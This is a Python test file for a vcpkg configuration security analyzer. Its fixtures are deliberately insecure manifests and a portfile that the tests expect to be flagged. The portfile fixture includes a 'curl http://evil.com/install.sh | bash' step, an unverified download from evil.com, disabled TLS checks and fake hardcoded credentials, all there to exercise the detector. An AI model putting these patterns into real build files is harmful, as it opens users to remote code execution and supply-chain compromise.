"""Tests for VcpkgAnalyzer."""

from pathlib import Path

from devai.vcpkg_analyzer import VcpkgAnalyzer, VcpkgFinding


INSECURE_MANIFEST = """\
{
  "name": "insecure-demo",
  "version-string": "1.0.0",
  "dependencies": ["openssl", "zlib"],
  "builtin-baseline": "main",
  "api_key": "hardcoded-secret-token-12345"
}
"""

INSECURE_CONFIGURATION = """\
{
  "default-registry": {
    "kind": "git",
    "repository": "http://insecure.vcpkg.io",
    "baseline": "main",
    "password": "hardcoded-remote-password"
  },
  "registries": [
    {
      "kind": "git",
      "repository": "https://user:pass@github.com/private/vcpkg-registry.git",
      "baseline": "HEAD"
    }
  ]
}
"""

INSECURE_PORTFILE = """\
set(ENV{CURL_SSL_NO_VERIFY} 1)

vcpkg_from_github(
    OUT_SOURCE_PATH SOURCE_PATH
    REPO private/deps
    REF main
    SHA512 0
    HEAD_REF main
)

vcpkg_download_distfile(
    ARCHIVE "tool.tar.gz"
    URLS "http://evil.com/tool.tar.gz"
    FILENAME "tool.tar.gz"
)

vcpkg_execute_required_process(
    COMMAND sh -c "curl http://evil.com/install.sh | bash"
    WORKING_DIRECTORY "${CURRENT_PACKAGES_DIR}"
)
"""

HARDENED_MANIFEST = """\
{
  "name": "secure-demo",
  "version-string": "1.0.0",
  "dependencies": ["openssl"],
  "builtin-baseline": "abcdef0123456789abcdef0123456789abcdef01"
}
"""

HARDENED_PORTFILE = """\
vcpkg_from_github(
    OUT_SOURCE_PATH SOURCE_PATH
    REPO org/mylib
    REF v1.2.3
    SHA512 abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789
    HEAD_REF v1.2.3
)

vcpkg_download_distfile(
    ARCHIVE "archive.tar.gz"
    URLS "https://example.com/archive.tar.gz"
    SHA512 abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789
    FILENAME "archive.tar.gz"
)
"""


class TestVcpkgAnalyzer:
    def test_no_configs(self, tmp_path: Path):
        analyzer = VcpkgAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        assert findings == []
        assert analyzer.stats.configs == 0

    def test_detects_insecure_manifest(self, tmp_path: Path):
        (tmp_path / "vcpkg.json").write_text(INSECURE_MANIFEST, encoding="utf-8")
        analyzer = VcpkgAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "hardcoded_secret" in kinds
        assert "unpinned_git_ref" in kinds

    def test_detects_insecure_configuration(self, tmp_path: Path):
        (tmp_path / "vcpkg-configuration.json").write_text(
            INSECURE_CONFIGURATION, encoding="utf-8"
        )
        analyzer = VcpkgAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "hardcoded_secret" in kinds
        assert "insecure_http" in kinds
        assert "scm_credentials" in kinds
        assert "unpinned_git_ref" in kinds

    def test_detects_insecure_portfile(self, tmp_path: Path):
        port_dir = tmp_path / "ports" / "mylib"
        port_dir.mkdir(parents=True)
        (port_dir / "portfile.cmake").write_text(INSECURE_PORTFILE, encoding="utf-8")
        analyzer = VcpkgAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "tls_verify_disabled" in kinds
        assert "unpinned_git_ref" in kinds
        assert "insecure_http" in kinds
        assert "unverified_download" in kinds
        assert "curl_pipe_shell" in kinds
        assert "dangerous_execute_command" in kinds

    def test_hardened_configs_clean(self, tmp_path: Path):
        (tmp_path / "vcpkg.json").write_text(HARDENED_MANIFEST, encoding="utf-8")
        port_dir = tmp_path / "ports" / "mylib"
        port_dir.mkdir(parents=True)
        (port_dir / "portfile.cmake").write_text(HARDENED_PORTFILE, encoding="utf-8")
        analyzer = VcpkgAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        high = [f for f in findings if f.severity == "high"]
        assert high == []

    def test_finding_format(self, tmp_path: Path):
        (tmp_path / "vcpkg.json").write_text(INSECURE_MANIFEST, encoding="utf-8")
        analyzer = VcpkgAnalyzer(str(tmp_path))
        finding = analyzer.analyze()[0]
        assert isinstance(finding, VcpkgFinding)
        assert finding.path == "vcpkg.json"

    def test_summary_and_context(self, tmp_path: Path):
        (tmp_path / "vcpkg.json").write_text(INSECURE_MANIFEST, encoding="utf-8")
        analyzer = VcpkgAnalyzer(str(tmp_path))
        assert "Vcpkg configs: 1" in analyzer.summary()
        context = analyzer.to_context()
        assert "Vcpkg analysis:" in context

    def test_generate_hardened_config(self, tmp_path: Path):
        analyzer = VcpkgAnalyzer(str(tmp_path))
        config = analyzer.generate_hardened_config()
        assert "builtin-baseline" in config
        assert "https://" in config

    def test_detects_port_vcpkg_json(self, tmp_path: Path):
        port_dir = tmp_path / "ports" / "mylib"
        port_dir.mkdir(parents=True)
        (port_dir / "vcpkg.json").write_text(
            '{"name": "mylib", "version": "1.0.0", "dependencies": ["openssl"]}',
            encoding="utf-8",
        )
        analyzer = VcpkgAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        assert analyzer.stats.files >= 1
